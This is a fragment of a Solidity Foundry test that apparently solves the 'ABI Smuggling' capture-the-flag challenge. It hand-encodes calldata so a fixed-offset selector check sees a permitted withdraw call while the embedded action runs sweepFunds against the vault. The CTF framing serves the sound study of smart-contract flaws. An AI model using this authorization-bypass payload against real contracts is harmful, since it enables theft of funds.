...
contract ABISmugglingChallenge is Test {
    ...
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Aegis sweep -> calldata/ABI manipulation: execute() checks the selector at a FIXED calldata
        // offset (100) but runs the embedded actionData. Put the permitted `withdraw` selector at offset
        // 100 (passes the check) while actionData actually carries `sweepFunds(recovery, token)`.
        bytes memory payload = abi.encodePacked(
            vault.execute.selector,                 // [0:4]
            uint256(uint160(address(vault))),       // [4:36]   target = vault
            uint256(0x80),                          // [36:68]  actionData offset -> 128
            uint256(0),                             // [68:100] filler
            bytes4(hex"d9caed12"), bytes28(0),      // [100:104] withdraw selector (the checked one)
            uint256(0x44),                          // [132:164] actionData length = 68
            bytes4(hex"85fb709d"),                  // sweepFunds selector
            uint256(uint160(recovery)),             //   receiver
            uint256(uint160(address(token)))        //   token
        );
